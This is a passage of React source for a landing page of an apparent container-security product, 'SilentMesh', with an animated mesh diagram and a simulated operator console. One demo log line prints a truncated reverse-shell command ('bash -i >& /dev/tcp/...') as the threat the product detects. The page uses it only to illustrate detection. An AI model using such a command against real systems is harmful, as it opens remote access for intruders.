import React, { useState, useEffect, useRef } from 'react';
import { createRoot } from 'react-dom/client';
import { motion, useScroll, useTransform, useInView, AnimatePresence, useSpring, useMotionValue } from 'framer-motion';

// ============================================================
// ERROR BOUNDARY
// ============================================================
class ErrorBoundary extends React.Component {
  constructor(props) { super(props); this.state = { hasError: false }; }
  static getDerivedStateFromError() { return { hasError: true }; }
  render() {
    if (this.state.hasError) return (
      <div className="min-h-screen bg-[#090a0f] flex flex-col items-center justify-center font-mono text-gray-500 p-8 text-center">
        <p className="text-sm mb-4">Something went wrong inside the runtime environment.</p>
        <button onClick={() => window.location.reload()} className="px-4 py-2 border border-gray-800 hover:border-[#00c9a7] text-sm transition-colors">Reload System</button>
      </div>
    );
    return this.props.children;
  }
}

// ============================================================
// LENIS SMOOTH SCROLL (Delegated Anchor Interception)
// ============================================================
const useLenis = () => {
  useEffect(() => {
    if (typeof window === 'undefined' || !window.Lenis) return;
    if (window.matchMedia('(pointer: coarse)').matches) return; // skip mobile

    const lenis = new window.Lenis({
      duration: 1.4,
      easing: (t) => Math.min(1, 1.001 - Math.pow(2, -10 * t)),
      smoothWheel: true,
      touchMultiplier: 1.1,
    });

    let rafId;
    function raf(time) {
      lenis.raf(time);
      rafId = requestAnimationFrame(raf);
    }
    rafId = requestAnimationFrame(raf);

    const handleAnchorClick = (e) => {
      const targetAnchor = e.target.closest('a[href^="#"]');
      if (!targetAnchor) return;
      const targetId = targetAnchor.getAttribute('href');
      if (targetId === '#') return;
      const target = document.querySelector(targetId);
      if (target) {
        e.preventDefault();
        lenis.scrollTo(target, { offset: 0 });
      }
    };

    document.addEventListener('click', handleAnchorClick);

    return () => {
      lenis.destroy();
      if (rafId) cancelAnimationFrame(rafId);
      document.removeEventListener('click', handleAnchorClick);
    };
  }, []);
};

// ============================================================
// CUSTOM CURSOR
// ============================================================
const CustomCursor = () => {
  const dotX = useMotionValue(-100);
  const dotY = useMotionValue(-100);
  const ringX = useSpring(dotX, { stiffness: 240, damping: 25 });
  const ringY = useSpring(dotY, { stiffness: 240, damping: 25 });
  const [state, setState] = useState('default'); // default | hovering | hovering-cta | warning-state
  const [visible, setVisible] = useState(false);
  const visibleRef = useRef(false);

  useEffect(() => {
    if (window.matchMedia('(pointer: coarse)').matches) return;

    const move = (e) => {
      dotX.set(e.clientX);
      dotY.set(e.clientY);
      if (!visibleRef.current) {
        visibleRef.current = true;
        setVisible(true);
      }
    };

    const leave = () => { visibleRef.current = false; setVisible(false); };
    const enter = () => { visibleRef.current = true; setVisible(true); };

    window.addEventListener('mousemove', move);
    document.addEventListener('mouseleave', leave);
    document.addEventListener('mouseenter', enter);

    const handleMouseOver = (e) => {
      const el = e.target.closest('a, button, [role="button"], input, textarea, select, .magnetic, .interactive-node, .clickable');
      if (el) {
        const isCta = el.classList.contains('cta-primary') || el.getAttribute('type') === 'submit';
        const isWarning = el.classList.contains('warning-trigger');
        if (isWarning) {
          setState('warning-state');
        } else {
          setState(isCta ? 'hovering-cta' : 'hovering');
        }
      }
    };

    const handleMouseOut = (e) => {
      const el = e.target.closest('a, button, [role="button"], input, textarea, select, .magnetic, .interactive-node, .clickable');
      if (el) {
        setState('default');
      }
    };

    document.body.addEventListener('mouseover', handleMouseOver);
    document.body.addEventListener('mouseout', handleMouseOut);

    return () => {
      window.removeEventListener('mousemove', move);
      document.removeEventListener('mouseleave', leave);
      document.removeEventListener('mouseenter', enter);
      document.body.removeEventListener('mouseover', handleMouseOver);
      document.body.removeEventListener('mouseout', handleMouseOut);
    };
  }, []);

  if (typeof window !== 'undefined' && window.matchMedia('(pointer: coarse)').matches) return null;

  return (
    <>
      <motion.div
        className={`cursor-dot ${state !== 'default' ? 'hovering' : ''}`}
        style={{ x: dotX, y: dotY, translateX: '-50%', translateY: '-50%', opacity: visible ? 1 : 0 }}
      />
      <motion.div
        className={`cursor-ring ${state}`}
        style={{ x: ringX, y: ringY, translateX: '-50%', translateY: '-50%', opacity: visible ? 1 : 0 }}
      />
    </>
  );
};

// ============================================================
// MAGNETIC COMPONENT wrapper
// ============================================================
const Magnetic = ({ children, className = '', as = 'div', ...props }) => {
  const ref = useRef(null);
  const x = useMotionValue(0);
  const y = useMotionValue(0);
  const springX = useSpring(x, { stiffness: 180, damping: 15 });
  const springY = useSpring(y, { stiffness: 180, damping: 15 });

  const handleMouse = (e) => {
    const rect = ref.current?.getBoundingClientRect();
    if (!rect) return;
    const cx = rect.left + rect.width / 2;
    const cy = rect.top + rect.height / 2;
    x.set((e.clientX - cx) * 0.25);
    y.set((e.clientY - cy) * 0.25);
  };

  const reset = () => { x.set(0); y.set(0); };
  const Tag = motion[as] || motion.div;

  return (
    <Tag ref={ref} onMouseMove={handleMouse} onMouseLeave={reset}
      style={{ x: springX, y: springY }}
      className={`magnetic ${className}`} {...props}>
      {children}
    </Tag>
  );
};

// ============================================================
// RUNTIME ORCHESTRATION CANVAS (Interactive SVG centerpiece)
// ============================================================
const OrchestrationCanvas = ({ activeState = 'observe', overrideState = null, onInteractiveSelect = null }) => {
  const canvasRef = useRef(null);
  const [mousePos, setMousePos] = useState({ x: -1000, y: -1000 });
  const [hoveredNodeId, setHoveredNodeId] = useState(null);

  // Use the override state if set manually by user, otherwise fallback to scroll state
  const state = overrideState || activeState;

  // Track coordinates relative to SVG bounding box
  const handleMouseMove = (e) => {
    if (!canvasRef.current) return;
    const rect = canvasRef.current.getBoundingClientRect();
    const x = ((e.clientX - rect.left) / rect.width) * 400;
    const y = ((e.clientY - rect.top) / rect.height) * 500;
    setMousePos({ x, y });
  };

  const handleMouseLeave = () => {
    setMousePos({ x: -1000, y: -1000 });
    setHoveredNodeId(null);
  };

  // Define runtime nodes
  const nodes = [
    { id: 'gateway', label: 'API GATEWAY', x: 200, y: 80, ip: '10.0.1.10', services: 'ingress-controller' },
    { id: 'auth', label: 'SVC-AUTH', x: 100, y: 190, ip: '10.0.2.45', services: 'auth-tokens, session' },
    { id: 'payment', label: 'SVC-PAYMENT', x: 300, y: 190, ip: '10.0.2.98', services: 'stripe-client, checkout' },
    { id: 'worker', label: 'WORKER-POOL', x: 120, y: 320, ip: '10.0.3.12', services: 'async-jobs, processing' },
    { id: 'database', label: 'DB-PRIMARY', x: 280, y: 320, ip: '10.0.4.15', services: 'postgresql-primary' }
  ];

  // Define connections
  const links = [
    { from: 'gateway', to: 'auth' },
    { from: 'gateway', to: 'payment' },
    { from: 'auth', to: 'worker' },
    { from: 'auth', to: 'database' },
    { from: 'payment', to: 'database' },
    { from: 'worker', to: 'database' }
  ];

  // Calculate distance on mouse move to illuminate nearest node
  useEffect(() => {
    if (mousePos.x === -1000) return;
    let minDistance = 65; // Proximity threshold in SVG units
    let nearestNodeId = null;

    nodes.forEach((n) => {
      const d = Math.hypot(n.x - mousePos.x, n.y - mousePos.y);
      if (d < minDistance) {
        minDistance = d;
        nearestNodeId = n.id;
      }
    });

    setHoveredNodeId(nearestNodeId);
  }, [mousePos]);

  // Determine dynamic node visual styles based on current state
  const getNodeColor = (id) => {
    if (id === 'payment') {
      if (state === 'evaluate') return '#ffb700'; // Amber warning
      if (state === 'simulate') return '#ffb700';
      if (state === 'mitigate') return '#ff4a5a'; // Red containment
      if (state === 'rollback') return '#00c9a7'; // Restored to safe teal
    }
    return '#00c9a7'; // Normal Soft Teal
  };

  const getLinkStyle = (link) => {
    const isFromOrToPayment = link.from === 'payment' || link.to === 'payment';
    
    if (isFromOrToPayment) {
      if (state === 'mitigate') {
        return {
          stroke: 'rgba(255, 74, 90, 0.15)',
          strokeWidth: 1,
          strokeDasharray: '4 4'
        };
      }
      if (state === 'simulate') {
        return {
          stroke: 'rgba(255, 183, 0, 0.4)',
          strokeWidth: 1.2,
          strokeDasharray: '4 4'
        };
      }
      if (state === 'evaluate') {
        return {
          stroke: 'rgba(255, 183, 0, 0.4)',
          strokeWidth: 1.2
        };
      }
    }
    return {
      stroke: 'rgba(0, 201, 167, 0.15)',
      strokeWidth: 1
    };
  };

  // Pulse speed along lines
  const getPulseDuration = () => {
    if (state === 'evaluate') return 1.8;
    if (state === 'mitigate') return 4.0;
    return 3.2;
  };

  return (
    <div className="w-full max-w-[420px] aspect-[4/5] relative bg-[#0c0d14] border border-white/[0.03] rounded-lg p-6 flex flex-col justify-between shadow-2xl select-none">
      {/* Topology Header Details */}
      <div className="flex items-center justify-between border-b border-white/[0.04] pb-4 font-mono text-[8px] tracking-widest text-gray-500">
        <div className="flex items-center gap-2">
          <span className="w-1.5 h-1.5 rounded-full bg-[#00c9a7] animate-pulse" />
          <span>MESH STATE: {state.toUpperCase()}</span>
        </div>
        <span>COORD: {mousePos.x !== -1000 ? `${Math.round(mousePos.x)},${Math.round(mousePos.y)}` : 'OFFLINE'}</span>
      </div>

      {/* SVG Canvas Map */}
      <div className="flex-grow w-full relative overflow-hidden my-4" onMouseMove={handleMouseMove} onMouseLeave={handleMouseLeave}>
        <svg ref={canvasRef} viewBox="0 0 400 500" className="w-full h-full overflow-visible">
          {/* Grid lines in background */}
          <defs>
            <pattern id="canvas-grid" width="25" height="25" patternUnits="userSpaceOnUse">
              <path d="M 25 0 L 0 0 0 25" fill="none" stroke="rgba(255,255,255,0.015)" strokeWidth="0.5" />
            </pattern>
            <filter id="glow-teal">
              <feGaussianBlur stdDeviation="6" result="coloredBlur"/>
              <feMerge>
                <feMergeNode in="coloredBlur"/>
                <feMergeNode in="SourceGraphic"/>
              </feMerge>
            </filter>
            <filter id="glow-warning">
              <feGaussianBlur stdDeviation="6" result="coloredBlur"/>
              <feMerge>
                <feMergeNode in="coloredBlur"/>
                <feMergeNode in="SourceGraphic"/>
              </feMerge>
            </filter>
            <filter id="glow-danger">
              <feGaussianBlur stdDeviation="8" result="coloredBlur"/>
              <feMerge>
                <feMergeNode in="coloredBlur"/>
                <feMergeNode in="SourceGraphic"/>
              </feMerge>
            </filter>
          </defs>
          <rect width="100%" height="100%" fill="url(#canvas-grid)" />

          {/* eBPF Tracing Mode Layer (State specific view) */}
          {state === 'telemetry' && (
            <>
              {/* Boundary divider line */}
              <line x1="20" y1="250" x2="380" y2="250" stroke="rgba(255,255,255,0.1)" strokeWidth="1" strokeDasharray="5 5" />
              <text x="30" y="240" fill="rgba(255,255,255,0.3)" fontSize="8" fontFamily="monospace" tracking-widest>USER SPACE</text>
              <text x="30" y="270" fill="rgba(255,255,255,0.3)" fontSize="8" fontFamily="monospace" tracking-widest>KERNEL SPACE</text>
            </>
          )}

          {/* Connections / Paths */}
          {state !== 'telemetry' && links.map((link, idx) => {
            const fromNode = nodes.find(n => n.id === link.from);
            const toNode = nodes.find(n => n.id === link.to);
            if (!fromNode || !toNode) return null;
            const style = getLinkStyle(link);

            return (
              <g key={idx}>
                {/* Connection Wire */}
                <line
                  x1={fromNode.x} y1={fromNode.y}
                  x2={toNode.x} y2={toNode.y}
                  stroke={style.stroke}
                  strokeWidth={style.strokeWidth}
                  strokeDasharray={style.strokeDasharray}
                  className="transition-all duration-500"
                />

                {/* Flow Pulses */}
                {state !== 'mitigate' && (
                  <motion.circle
                    r="2"
                    fill={state === 'evaluate' ? '#ffb700' : '#00f0ff'}
                    style={{ filter: 'drop-shadow(0 0 2px rgba(0, 240, 255, 0.8))' }}
                    initial={{ offset: 0 }}
                    animate={{
                      cx: state === 'rollback' ? [toNode.x, fromNode.x] : [fromNode.x, toNode.x],
                      cy: state === 'rollback' ? [toNode.y, fromNode.y] : [fromNode.y, toNode.y]
                    }}
                    transition={{
                      duration: getPulseDuration(),
                      repeat: Infinity,
                      ease: 'linear',
                      delay: idx * 0.5
                    }}
                  />
                )}
              </g>
            );
          })}

          {/* Scoped Containment boundary ring */}
          {state === 'mitigate' && (
            <g>
              <motion.rect
                x="250" y="145" width="100" height="90" rx="6"
                fill="none"
                stroke="#ff4a5a"
                strokeWidth="1.2"
                style={{ filter: 'url(#glow-danger)' }}
                initial={{ opacity: 0, scale: 0.85 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ duration: 0.5, ease: 'easeOut' }}
              />
              <text x="300" y="250" textAnchor="middle" fill="#ff4a5a" fontSize="6" fontFamily="monospace" tracking-widest>CONTAINED CAPABILITY</text>
            </g>
          )}

          {/* Shadow simulation boundary ring */}
          {state === 'simulate' && (
            <g>
              <motion.rect
                x="255" y="150" width="90" height="80" rx="6"
                fill="none"
                stroke="#00c9a7"
                strokeWidth="1"
                strokeDasharray="4 4"
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: [0.3, 0.7, 0.3] }}
                transition={{ duration: 2, repeat: Infinity }}
              />
              <text x="300" y="245" textAnchor="middle" fill="#00c9a7" fontSize="6" fontFamily="monospace" tracking-widest>SHADOW BOUNDARY</text>
            </g>
          )}

          {/* Draw Nodes */}
          {state !== 'telemetry' && nodes.map((node) => {
            const isHovered = hoveredNodeId === node.id;
            const nodeColor = getNodeColor(node.id);
            
            // Adjust coordinates slightly for isometric view on progressive trust state
            let nx = node.x;
            let ny = node.y;

            const isWarning = node.id === 'payment' && (state === 'evaluate' || state === 'simulate');
            const isDanger = node.id === 'payment' && state === 'mitigate';

            let filterGlow = 'glow-teal';
            if (isWarning) filterGlow = 'glow-warning';
            if (isDanger) filterGlow = 'glow-danger';

            return (
              <g key={node.id} className="interactive-node" transform={`translate(0, 0)`}>
                {/* External Proximity Aura */}
                {isHovered && (
                  <circle
                    cx={nx} cy={ny} r="22"
                    fill="none"
                    stroke={nodeColor}
                    strokeWidth="0.5"
                    strokeDasharray="2 3"
                    className="animate-spin"
                    style={{ animationDuration: '8s' }}
                  />
                )}

                {/* Node Base Shadow */}
                <circle
                  cx={nx} cy={ny} r={isHovered ? 12 : 9}
                  fill="#090a0f"
                  stroke={nodeColor}
                  strokeWidth="1"
                  className="transition-all duration-300"
                  style={{ filter: isHovered || isWarning || isDanger ? `url(#${filterGlow})` : 'none' }}
                />

                {/* Node Center Core */}
                <circle
                  cx={nx} cy={ny}
                  r={isDanger ? 4 : 3}
                  fill={nodeColor}
                  className="transition-all duration-300"
                />

                {/* Monospaced Labels */}
                <text
                  x={nx} y={ny - (isHovered ? 18 : 14)}
                  textAnchor="middle"
                  fill={isHovered ? '#ffffff' : 'rgba(255,255,255,0.45)'}
                  fontSize="7"
                  fontFamily="Space Grotesk, sans-serif"
                  fontWeight="600"
                  letterSpacing="0.05em"
                  className="transition-all duration-300 select-none pointer-events-none"
                >
                  {node.label}
                </text>

                {/* Telemetry Hover Overlays */}
                {isHovered && (
                  <g transform={`translate(${nx + 16}, ${ny - 20})`} className="pointer-events-none">
                    <rect x="-4" y="-12" width="105" height="36" fill="rgba(14, 15, 22, 0.95)" stroke="rgba(255,255,255,0.06)" strokeWidth="0.5" rx="3" />
                    <text x="2" y="-4" fill="#ffffff" fontSize="5.5" fontFamily="monospace">IP: {node.ip}</text>
                    <text x="2" y="3" fill={nodeColor} fontSize="5.5" fontFamily="monospace">STATE: {isDanger ? 'RESTRICTED' : isWarning ? 'WARNING' : 'STABLE'}</text>
                    <text x="2" y="10" fill="rgba(255,255,255,0.35)" fontSize="5" fontFamily="monospace">SVC: {node.services.split(',')[0]}</text>
                  </g>
                )}
              </g>
            );
          })}

          {/* eBPF Tracing Visualizer */}
          {state === 'telemetry' && (
            <g transform="translate(40, 60)">
              {/* Telemetry hook nodes */}
              <rect x="20" y="210" width="280" height="30" rx="3" fill="#12131a" stroke="rgba(255,255,255,0.05)" />
              <text x="160" y="228" textAnchor="middle" fill="#00c9a7" fontSize="7" fontFamily="monospace" letterSpacing="0.05em">BPF_PROG(sys_enter_execve, struct pt_regs *regs)</text>

              {/* Data rings flowing up to user space */}
              <line x1="160" y1="210" x2="160" y2="80" stroke="rgba(0, 201, 167, 0.15)" strokeWidth="1" />
              <motion.circle
                r="3"
                fill="#00c9a7"
                initial={{ cy: 210 }}
                animate={{ cy: 80 }}
                transition={{ duration: 2, repeat: Infinity, ease: 'easeOut' }}
              />

              {/* SilentMesh Daemon in user space */}
              <rect x="100" y="40" width="120" height="40" rx="4" fill="#090a0f" stroke="#00c9a7" strokeWidth="1" style={{ filter: 'url(#glow-teal)' }} />
              <text x="160" y="60" textAnchor="middle" fill="#ffffff" fontSize="8" fontFamily="monospace">silentmesh-daemon</text>
              <text x="160" y="70" textAnchor="middle" fill="#00c9a7" fontSize="6" fontFamily="monospace">USER SPACE EVALUATION</text>
            </g>
          )}

          {/* Compatibility Diagram overlay */}
          {state === 'compatibility' && (
            <g transform="translate(50, 80)">
              {/* Rows of nodes showing OS kernel layers */}
              {['AWS EKS', 'Ubuntu LTS', 'RHEL 8+', 'Linux kernel 5.4+'].map((layer, idx) => (
                <g key={idx} transform={`translate(0, ${idx * 75})`}>
                  <rect x="10" y="0" width="280" height="35" rx="3" fill="#12131a" stroke="rgba(0, 201, 167, 0.2)" strokeWidth="0.5" />
                  <circle cx="28" cy="18.5" r="4" fill="#00c9a7" />
                  <text x="45" y="21" fill="#ffffff" fontSize="9" fontFamily="Space Grotesk, sans-serif" fontWeight="500">{layer}</text>
                  <text x="270" y="21" textAnchor="end" fill="rgba(255,255,255,0.3)" fontSize="7" fontFamily="monospace">COMPATIBLE</text>
                </g>
              ))}
            </g>
          )}
        </svg>
      </div>

      {/* Manual User Control overrides */}
      <div className="border-t border-white/[0.04] pt-4 text-left">
        <span className="font-mono text-[7px] text-gray-500 tracking-[0.2em] uppercase block mb-2.5">INTERACTIVE STATE CONTROLLER</span>
        <div className="flex flex-wrap gap-1.5">
          {['observe', 'evaluate', 'simulate', 'mitigate', 'rollback'].map((st) => (
            <button
              key={st}
              onClick={() => onInteractiveSelect(st)}
              className={`font-mono text-[7.5px] uppercase tracking-wider px-2.5 py-1 border transition-all duration-300 ${
                state === st
                  ? 'bg-[#00c9a7]/10 border-[#00c9a7] text-[#00c9a7] font-semibold'
                  : 'bg-transparent border-white/[0.05] text-gray-500 hover:text-white hover:border-white/20'
              }`}
            >
              {st}
            </button>
          ))}
          {overrideState && (
            <button
              onClick={() => onInteractiveSelect(null)}
              className="font-mono text-[7.5px] uppercase tracking-wider px-2.5 py-1 bg-white/5 border border-white/10 text-white hover:bg-white/10"
            >
              Sync Scroll
            </button>
          )}
        </div>
      </div>
    </div>
  );
};

// ============================================================
// SYSTEM WORKFLOW LOGS READOUT (Matches Canvas States)
// ============================================================
const ConsoleLogs = ({ activeState = 'observe', overrideState = null }) => {
  const state = overrideState || activeState;

  const logLines = {
    observe: [
      { t: '12:04:15.002', tag: 'SYS', msg: 'Profiling process namespaces for EKS cluster nodes...' },
      { t: '12:04:15.008', tag: 'BPF', msg: 'Kernel probes attached: sys_enter_execve, bprm_check_security' },
      { t: '12:04:16.142', tag: 'INF', msg: 'Telemetry mapped: 14 active tasks, zero context-switch latency' }
    ],
    evaluate: [
      { t: '12:04:22.408', tag: 'WARN', msg: 'Unregistered fork detected inside svc-payment pod #10-0-2-98', type: 'warn' },
      { t: '12:04:22.412', tag: 'WARN', msg: 'Command execution profile mismatch: bash -i >& /dev/tcp/198.51...', type: 'warn' },
      { t: '12:04:22.415', tag: 'SYS', msg: 'Correlating namespaces... Parent PID: 1422 -> Target PID: 1489' }
    ],
    simulate: [
      { t: '12:04:25.101', tag: 'SIM', msg: 'Shadow mode activated. Testing scoped restriction parameters...' },
      { t: '12:04:25.110', tag: 'SIM', msg: 'Namespace constraints mapped. Simulation score: 0 BUSINESS DISRUPTION' },
      { t: '12:04:26.012', tag: 'INF', msg: 'Policy check simulated: execution blocked in-memory. Telemetry recorded.' }
    ],
    mitigate: [
      { t: '12:04:30.982', tag: 'ACT', msg: 'SCOPED CONTAINER CONTAINMENT TRIGGERED. PID 1489 sandbox initialized.', type: 'danger' },
      { t: '12:04:30.985', tag: 'ACT', msg: 'LSM hook bprm_check_security: dropping writes to system bins.', type: 'danger' },
      { t: '12:04:31.002', tag: 'INF', msg: 'Rerouting cluster dependencies. Zero drop on gateway ingress.' }
    ],
    rollback: [
      { t: '12:04:35.004', tag: 'UNDO', msg: 'Operator authorized state recovery key #SM-772-B.', type: 'success' },
      { t: '12:04:35.012', tag: 'UNDO', msg: 'Releasing namespace capability constraints on pod #10-0-2-98.', type: 'success' },
      { t: '12:04:35.080', tag: 'INF', msg: 'Telemetry baseline restored. Verification audit lock successfully stored.' }
    ]
  };

  const currentLogs = logLines[state] || logLines['observe'];

  return (
    <div className="w-full bg-[#0c0d14] border border-white/[0.03] rounded-lg p-5 font-mono text-[9.5px] leading-relaxed text-gray-500 shadow-2xl h-[170px] flex flex-col justify-between">
      <div className="flex items-center justify-between border-b border-white/[0.04] pb-2 text-[7.5px] tracking-widest text-gray-600">
        <span>SRE OPERATOR SHELL</span>
        <span>TELEMETRY TIMELINE</span>
      </div>
      <div className="flex-grow overflow-y-auto py-2.5 space-y-1.5">
        <AnimatePresence mode="popLayout">
          {currentLogs.map((log, idx) => (
            <motion.div
              key={log.msg}
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 10 }}
              transition={{ duration: 0.3, delay: idx * 0.1 }}
              className="flex items-start gap-3"
            >
              <span className="text-[8px] text-gray-600 shrink-0">{log.t}</span>
              <span className={`px-1 rounded-[2px] font-bold text-[7.5px] shrink-0 ${
                log.type === 'warn' ? 'bg-[#ffb700]/10 text-[#ffb700]' :
                log.type === 'danger' ? 'bg-red-500/10 text-red-400' :
                log.type === 'success' ? 'bg-[#00c9a7]/10 text-[#00c9a7]' :
                'bg-white/5 text-gray-400'
              }`}>{log.tag}</span>
              <span className="text-gray-300 font-light truncate">{log.msg}</span>
            </motion.div>
          ))}
        </AnimatePresence>
      </div>
      <div className="border-t border-white/[0.04] pt-2 text-[7px] text-gray-600 flex justify-between">
        <span>READY FOR REVERSION</span>
        <span>CHECKPOINT KEY: SEC_CHECK_5.4.1</span>
      </div>
    </div>
  );
};

// ============================================================
// SECTION SCROLL WRAPPER (Tracks viewport visibility)
// ============================================================
const SectionWrapper = ({ id, activeStateName, setActiveState, children, className = '' }) => {
  const ref = useRef(null);
  // Track when the section enters the screen viewport center
  const isInView = useInView(ref, { margin: "-45% 0px -45% 0px" });

  useEffect(() => {
    if (isInView) {
      setActiveState(activeStateName);
    }
  }, [isInView, activeStateName, setActiveState]);

  return (
    <div id={id} ref={ref} className={`min-h-screen py-24 md:py-36 px-6 md:px-12 flex flex-col justify-center relative border-b border-white/[0.02] last:border-b-0 ${className}`}>
      {children}
    </div>
  );
};

// ============================================================
// NAVIGATION
// ============================================================
const NavBar = () => {
  const [open, setOpen] = useState(false);
  const [scrolled, setScrolled] = useState(false);

  useEffect(() => {
    const onScroll = () => { setScrolled(window.scrollY > 40); };
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  const links = [
    { href: '#hero', label: 'Observe' },
    { href: '#progressive-trust', label: 'Progressive Trust' },
    { href: '#scoped-containment', label: 'Containment' },
    { href: '#reversibility', label: 'Reversibility' },
    { href: '#safety-boundaries', label: 'Operational Safety' }
  ];

  return (
    <motion.nav role="navigation" aria-label="Primary navigation"
      initial={{ y: -30, opacity: 0 }} animate={{ y: 0, opacity: 1 }}
      transition={{ duration: 0.7, delay: 0.2 }}
      className={`fixed top-0 w-full z-40 transition-all duration-500 ${scrolled ? 'bg-[#090a0f]/90 backdrop-blur-2xl border-b border-white/[0.03] shadow-2xl' : ''}`}
    >
      <div className="max-w-7xl mx-auto px-6 md:px-12 lg:px-24 flex items-center justify-between h-16">
        <a href="#" className="font-['Space_Grotesk'] font-bold text-base text-white tracking-tight hover:text-[#00c9a7] transition-colors duration-300 flex items-center gap-2">
          <svg className="w-4 h-4 text-[#00c9a7]" viewBox="0 0 100 100" fill="none" stroke="currentColor" strokeWidth="12">
            <polygon points="50,15 85,35 85,75 50,95 15,75 15,35" />
            <circle cx="50" cy="55" r="15" fill="currentColor" />
          </svg>
          SilentMesh
        </a>
        <div className="hidden md:flex items-center gap-8">
          {links.map(l => (
            <a key={l.href} href={l.href} className="text-[10px] font-mono uppercase tracking-widest text-gray-400 hover:text-white transition-colors duration-300">
              {l.label}
            </a>
          ))}
          <Magnetic as="a" href="#cta"
            className="cta-primary text-[10px] font-mono uppercase tracking-wider px-5 py-2.5 border border-white/10 text-white hover:bg-white hover:text-[#090a0f] transition-all duration-300">
            Access Registry
          </Magnetic>
        </div>
        <button className="md:hidden flex flex-col gap-1.5 p-2" aria-label="Menu" onClick={() => setOpen(!open)}>
          <span className={`block w-5 h-px bg-white transition-all duration-300 ${open ? 'translate-y-[3px] rotate-45' : ''}`} />
          <span className={`block w-5 h-px bg-white transition-all duration-300 ${open ? 'opacity-0' : ''}`} />
          <span className={`block w-5 h-px bg-white transition-all duration-300 ${open ? '-translate-y-[3px] -rotate-45' : ''}`} />
        </button>
      </div>
      <AnimatePresence>
        {open && (
          <motion.div initial={{ height: 0, opacity: 0 }} animate={{ height: 'auto', opacity: 1 }}
            exit={{ height: 0, opacity: 0 }} transition={{ duration: 0.3 }}
            className="md:hidden bg-[#090a0f]/95 backdrop-blur-xl border-t border-white/5 overflow-hidden">
            <div className="px-6 py-6 flex flex-col gap-4">
              {links.map(l => <a key={l.href} href={l.href} onClick={() => setOpen(false)} className="text-xs font-mono tracking-wide text-gray-400 hover:text-white">{l.label}</a>)}
              <a href="#cta" onClick={() => setOpen(false)} className="text-xs font-mono tracking-wide text-[#00c9a7]">Access Registry</a>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </motion.nav>
  );
};

// ============================================================
// APP ENTRYPOINT
// ============================================================
const App = () => {
  useLenis();
  const [activeState, setActiveState] = useState('observe');
  const [overrideState, setOverrideState] = useState(null);

  // eBPF interactive state
  const [activeTab, setActiveTab] = useState('ebpf'); // ebpf | lsm

  // Compatibility matrix search state
  const compatibilityFilters = [
    { cat: 'kernel', label: 'Kernels' },
    { cat: 'cloud', label: 'Cloud' },
    { cat: 'arch', label: 'Arch' }
  ];
  const [compatFilter, setCompatFilter] = useState('all');

  // Contact/CTA state
  const [formStatus, setFormStatus] = useState('idle');

  // Workflow Active step
  const [activeStep, setActiveStep] = useState(0);

  const workflowSteps = [
    { title: 'TELEMETRY ATTACH', desc: 'eBPF probes hook syscall structures locally with < 0.05% CPU footprint.', state: 'observe' },
    { title: 'SIGNAL CORRELATION', desc: 'Events correlate with container namespace credentials.', state: 'evaluate' },
    { title: 'SHADOW TEST', desc: 'Sandbox isolation parameters are evaluated in memory.', state: 'simulate' },
    { title: 'CONTAINMENT ACTIVE', desc: 'LSM namespace permissions are scoped to prevent lateral spread.', state: 'mitigate' },
    { title: 'REVERSION DECREE', desc: 'Checked state rolls back instantly without system reboot.', state: 'rollback' }
  ];

  const handleFormSubmit = async (e) => {
    e.preventDefault();
    setFormStatus('loading');
    const form = e.target;
    const data = new FormData(form);
    
    try {
      const response = await fetch(form.action, {
        method: form.method,
        body: data,
        headers: { 'Accept': 'application/json' }
      });
      if (response.ok) {
        setFormStatus('success');
        form.reset();
      } else {
        setFormStatus('error');
      }
    } catch (err) {
      setFormStatus('error');
    }
  };

  return (
    <ErrorBoundary>
      <div className="relative bg-[#090a0f]">
        <CustomCursor />
        <NavBar />
        
        {/* Cinematic Backdrop Layer */}
        <div className="ambient-glow">
          <div className="glow-blob blob-primary" />
          <div className="glow-blob blob-secondary" />
        </div>
        <div className="grid-mesh" />

        {/* Fullscreen split container */}
        <main className="split-sticky-container max-w-[1600px] mx-auto relative z-10" id="main-content">
          
          {/* LEFT COLUMN: Narrative Editorial Sections */}
          <div className="scrolling-content-wrapper pr-0 lg:pr-8 border-r border-white/[0.01]">
            
            {/* 1. HERO RUNTIME ENVIRONMENT */}
            <SectionWrapper id="hero" activeStateName="observe" setActiveState={setActiveState}>
              <div className="text-left max-w-xl">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">01 INFRASTRUCTURE RUNTIME</span>
                <h1 className="text-5xl md:text-[5.5rem] font-['Space_Grotesk'] font-bold leading-[0.95] tracking-tighter mb-10 text-white select-none">
                  INTELLIGENT<br/>
                  RUNTIME<br/>
                  MESH.
                </h1>
                <p className="text-sm md:text-base text-gray-400 font-light leading-relaxed mb-12 max-w-md">
                  SilentMesh observes container behaviors via eBPF, simulates containment in memory, and mitigates threats dynamically. Reversible by design. Zero latency impact.
                </p>
                <div className="flex flex-wrap gap-4 mb-20">
                  <Magnetic as="a" href="#cta" className="cta-primary inline-flex items-center justify-center px-6 py-3 bg-[#00c9a7] text-[#090a0f] font-mono text-[10px] uppercase tracking-wider font-semibold">
                    Request Access
                  </Magnetic>
                  <a href="#progressive-trust" className="inline-flex items-center justify-center px-6 py-3 border border-white/10 text-white font-mono text-[10px] uppercase tracking-wider hover:bg-white hover:text-black transition-colors">
                    Explore Platform
                  </a>
                </div>
                <div className="border-t border-white/5 pt-8 max-w-sm flex items-center justify-between text-[9px] font-mono text-gray-500 tracking-wider">
                  <span>LATENCY: &lt;0.02ms</span>
                  <span>KERNEL COMPATIBLE: LTS 5.4+</span>
                  <span>eBPF NATIVE</span>
                </div>
              </div>
            </SectionWrapper>

            {/* 2. OPERATIONAL CHALLENGES */}
            <SectionWrapper id="challenges" activeStateName="observe" setActiveState={setActiveState}>
              <div className="max-w-xl text-left">
                <span className="font-mono text-[9px] text-[#00c9a7] tracking-[0.25em] uppercase block mb-6">02 SYSTEM FRICTION</span>
                <h2 className="text-3xl md:text-[3.2rem] font-['Space_Grotesk'] font-bold leading-tight text-white mb-12 tracking-tight">
                  THE LATENCY OF<br/>REACTION.
                </h2>
                <div className="space-y-12">
                  <div className="border-l-2 border-red-500/30 pl-6">
